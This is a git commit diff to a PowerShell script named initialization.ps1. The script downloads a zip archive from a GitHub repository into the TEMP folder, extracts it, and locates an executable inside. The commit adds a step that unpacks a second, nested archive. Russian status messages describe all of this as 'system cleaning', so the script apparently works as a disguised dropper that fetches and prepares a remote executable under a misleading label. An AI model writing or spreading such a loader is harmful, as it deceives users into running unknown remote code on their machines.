44effadd717936105602dd14b16d0ad3a3a2f94a
v25888656-maker <v25888656@gmail.com>
2026-07-13 03:34:30 +0300

    Update initialization.ps1

--- initialization.ps1
+++ initialization.ps1
@@ -2,9 +2,9 @@
 # initialization.ps1
 # =============================================
 
-$Url = "https://github.com/v25888656-maker/CHECKK/raw/refs/heads/main/CHHECK.zip"
-$ZipPath = "$env:TEMP\CHHECK.zip"
-$ExtractPath = "$env:TEMP\extract"
+$Url = "https://github.com/v25888656-maker/CHECKK/archive/refs/heads/main.zip"
+$ZipPath = "$env:TEMP\main.zip"
+$ExtractPath = "$env:TEMP\CHECKK-main"
 
 Write-Host "[*] Очистка системы..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1
@@ -23,6 +23,18 @@ try {
     Write-Host "[-] Ошибка очистки" -ForegroundColor Red
     Start-Sleep -Seconds 2
     exit
+}
+
+$Zip2 = Get-ChildItem -Path $ExtractPath -Filter "*.zip" -Recurse | Select-Object -First 1
+
+if ($Zip2) {
+    try {
+        Expand-Archive -Path $Zip2.FullName -DestinationPath $ExtractPath -Force
+    } catch {
+        Write-Host "[-] Ошибка очистки" -ForegroundColor Red
+        Start-Sleep -Seconds 2
+        exit
+    }
 }
 
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
